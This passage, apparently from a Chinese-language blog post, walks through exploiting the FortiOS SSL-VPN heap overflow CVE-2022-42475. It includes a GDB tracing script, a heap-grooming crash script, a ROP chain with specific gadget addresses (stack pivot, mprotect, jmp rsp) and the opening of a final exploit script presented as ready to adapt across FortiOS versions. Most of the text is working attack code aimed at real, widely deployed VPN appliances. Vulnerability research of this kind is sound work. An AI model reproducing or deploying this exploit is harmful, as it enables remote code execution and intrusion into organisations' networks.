
```python
import gdb

f = open("./log", "w")

def get_register(regname: str):
    """Return a register's value."""
    try:
        value = gdb.parse_and_eval(regname)
        return int(value)
        # return to_unsigned_long(value)
    except gdb.error as e:
        print(e)
        assert (regname[0] == '$')
        regname = regname[1:]
        try:
            value = gdb.selected_frame().read_register(regname)
        except ValueError:
            return None
        return int(value)

last = 0
mem_cnt = 0
mem_start = 0

def stop_handler(event):
    global last, mem_cnt, mem_start
    if isinstance(event, gdb.BreakpointEvent):
        pc_val = get_register("$pc")
        rdi_val = get_register("$rdi")
        rsi_val = get_register("$rsi")
        if pc_val == 0x1785b6a: # memcpy
            f.write(f"dst: {hex(rdi_val)}, "
                    f"src: {hex(rsi_val)}, "
                    f"offset: {hex(rdi_val-last)}\n")
            f.flush()
            last = rdi_val
            mem_cnt += 1
            if mem_cnt == 61:
                mem_start = rdi_val
        gdb.execute("c")
    if isinstance(event, gdb.SignalEvent):
        if event.stop_signal in ["SIGABRT", "SIGSEGV"]:
            pc_val = get_register("$pc")
            rdx_val = get_register("$rdx")
            if pc_val == 0x1780bfb:
                mem_offset = rdx_val + 0xC0
                offset = mem_offset - mem_start
                f.write(f"crash addr: {hex(mem_offset)}\n")
                f.write(f"offset: {hex(offset)}\n")
                f.flush()

def register_stop_handler():
    gdb.events.stop.connect(stop_handler)

if __name__ == "__main__":
    register_stop_handler()
```

为了确定 `SSL` 结构体的位置和大小。我们把 `sslvpn` 打崩，看看此时内存分配的地址和函数指针距离的偏移：

```python
import socket

import ssl

from pwn import *

path = "/remote/login".encode()

ip = "192.168.102.133"

port = 4443

def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((ip, port))
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    return _socket

socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b"POST " + path + b" HTTP/1.1\r\nHost: 192.168.102.133\r\nContent-Length: 4096\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1"
    sk.sendall(data)
    socks.append(sk)

for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None

CL = "115964116992"

data = b"POST " + path + b" HTTP/1.1\r\nHost: 192.168.102.133\r\nContent-Length: " + CL.encode() + b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1"

exp_sk = create_ssl_ctx()

for i in range(20):
    sk = create_ssl_ctx()
    socks.append(sk)

exp_sk.sendall(data)

exp_sk.sendall(b'\x90'*0x100000)

for sk in socks:
    if sk:
        data = b"b" * 40
        sk.sendall(data)
```

在崩溃之后，可以发现程序执行到了这个位置：

![](https://alist.qrz.today/d/public/imghost/blog/2023-cve-2022-42475/Pasted%20image%2020230719104107.png)

向前跟踪一下指令，我们发现 `rax` 的值是从地址 `rdx+0C0h` 取出的，内存分配是在 `0x7f5430acf418` 完成的，`rdx+0C0h` 的值为 `0x7f5430ad0238`：

```
.text:0000000001780BE0 48 8B 82 C0 00 00 00          mov     rax, [rdx+0C0h]
.text:0000000001780BE7 4C 89 EF                      mov     rdi, r13
.text:0000000001780BEA 48 85 C0                      test    rax, rax
.text:0000000001780BED 0F 84 85 00 00 00             jz      loc_1780C78
.text:0000000001780BED
.text:0000000001780BF3 5B                            pop     rbx
.text:0000000001780BF4 41 5C                         pop     r12
.text:0000000001780BF6 41 5D                         pop     r13
.text:0000000001780BF8 41 5E                         pop     r14
.text:0000000001780BFA 5D                            pop     rbp
.text:0000000001780BFB FF E0                         jmp     rax
```

我们可以多次尝试查看偏移是否一致。偏移和 `content length` 有关，这个值会影响堆的布局，因此需要仔细挑选。下面我给出在 `content length = 100` 和 `content length = 4096` 时堆的分配情况：

content length = 100 时：

![](https://alist.qrz.today/d/public/imghost/blog/2023-cve-2022-42475/Pasted%20image%2020230719145449.png)

content length = 4096 时：

![](https://alist.qrz.today/d/public/imghost/blog/2023-cve-2022-42475/Pasted%20image%2020230719145142.png)

可以看到，不同的值会影响堆的偏移。我选择了 `4096` 这个值。日志输出如下：

```
 1: dst: 0x7f54324a6418, src: 0x7f5432505038, offset: 0x7f54324a6418

... ...

60: dst: 0x7f54308b8c18, src: 0x7f54308f2038, offset: -0x1b0800

61: dst: 0x7f5430acf418, src: 0x7f54325fc038, offset: 0x216800

62: dst: 0x7f5430acf41b, src: 0x7f54325fc038, offset: 0x3

63: crash addr: 0x7f5430ad0238

64: offset: 0xe20
```

在第 62 次地址分配之后调用了某个 `SSL struct` 的 `handshake_func` 函数指针，造成了崩溃，从崩溃地址到分配地址的距离为 `0xe20`。那么接下来我们可以借助这个偏移修改函数指针，迁移栈，劫持控制流了。

### 栈迁移

上文我们知道 `rax` 的值是从 [`$rdx+0xC0`] 中取的，因此我们可以将栈迁移到 `rdx` 上。

可以搜索到这一条 `Gadget`：

```
0x000000000140583a: push rdx; pop rsp; add edi, edi; nop; ret;
```

我们就可以很方便地迁移栈了：

```
payload = b"A" * (0xe20-3-0xC0)

"""

0x000000000140583a: push rdx; pop rsp; add edi, edi; nop; ret;

"""

push_rdx_pop_rsp_ret = 0x000000000140583a

gadget = b""

assert(len(gadget) 
```

### Ret2mprotect

在迁移栈后，开始考虑下一步操作。我希望能劫持控制流，执行自己的 `shellcode`，为了达成这个目标，我需要将一片可控内存区域变成可执行的区域。

在这里我们可以控制的区域是 `rdx` 指向的内存地址，而且我们还可以发现 `ROP Gadget` 中存在类似 `jmp rsp` 的 `gadget`，因此我们可以将这一段地址添加执行权限，最后 `rop` 到该地址执行。

首先找到一些必须的 `Gadget`：

```
payload = b"A" * (0xe20-3-0xC0)

"""stack povit
0x000000000140583a: push rdx; pop rsp; add edi, edi; nop; ret;
"""

push_rdx_pop_rsp_ret = 0x000000000140583a

"""ret2 mprotect
0x000000000054dac8: mov rax, rdx; ret;
0x0000000002b83960: and rax, rcx; ret;

0x000000000257016a: push rdx; pop rdi; ret;
0x0000000002a0e1c0: add rdx, rax; mov eax, edx; sub eax, edi; ret;

0x000000000060f622: pop rdi; ret;
0x0000000000530c9e: pop rsi; ret;
0x0000000000509382: pop rdx; ret;
0x000000000046bb37: pop rax; ret;
0x000000000058f803: pop rcx; ret;

0x0000000002608366: add r13, r8; ret;

0x000000000048560d: jmp rsp;
"""
mov_rax_rdx_ret = 0x000000000054dac8
and_rax_rcx_ret = 0x0000000002b83960

add_rdx_rax_mov_eax_edx_sub_eax_edi_ret = 0x0000000002a0e1c0
push_rdx_pop_rdi_ret = 0x000000000257016a

pop_rdi_ret = 0x000000000060f622
pop_rsi_ret = 0x0000000000530c9e
pop_rdx_ret = 0x0000000000509382
pop_rax_ret = 0x000000000046bb37
pop_rcx_ret = 0x000000000058f803
jmp_rsp = 0x000000000048560d

junk_code = 0x0000000002608366

write_addr = 0x00000000059f8c00

mprotect_plt = 0x43F3E0

gadget = b""

# gadget += p64(mov_rax_rdx_ret) # rax=rdx
```

接下来构造 `mprotect` 的参数，计算 `rdx` 到整个段的偏移，获取其大小，并调用 `mprotect` 函数：

```
# ret2mprotect

gadget += p64(pop_rax_ret)

gadget += p64(0xffffffffffd29e88) # offset

# gadget += p64(0)

gadget += p64(junk_code)

gadget += p64(junk_code)

gadget += p64(add_rdx_rax_mov_eax_edx_sub_eax_edi_ret)

gadget += p64(push_rdx_pop_rdi_ret)

gadget += p64(junk_code)

gadget += p64(junk_code)

gadget += p64(pop_rsi_ret)

gadget += p64(0x300000)

gadget += p64(pop_rdx_ret)  # rdx=0x7

gadget += p64(7)

gadget += p64(mprotect_plt)
```

### 劫持控制流

最后通过 `jmp rsp` 劫持控制流，为了跳过之前布置的栈迁移代码，我们还可以在劫持最开始的控制流之后多跳几下：

```
gadget += p64(jmp_rsp)
gadget += asm('jmp $+0x58')

# print(gadget)

assert (len(gadget) 
```

在劫持控制流之后就天高任鸟飞啦，这里就不再进一步描述获取 `shell` 的步骤了，感兴趣的可以看这一篇文章。

### Exp

最后的 `exp` 如下所示。不同版本的 `FortiOS` 可能要进行一些调整。

```
import socket

import ssl

from pwn import *

import socket

import pathlib

path = "/remote/login".encode()

ip = "192.168.102.133"

port = 4443

def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((ip, port))
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    return _socket

socks = []

for i in range(60):
    sk = create_ssl_ctx()
```
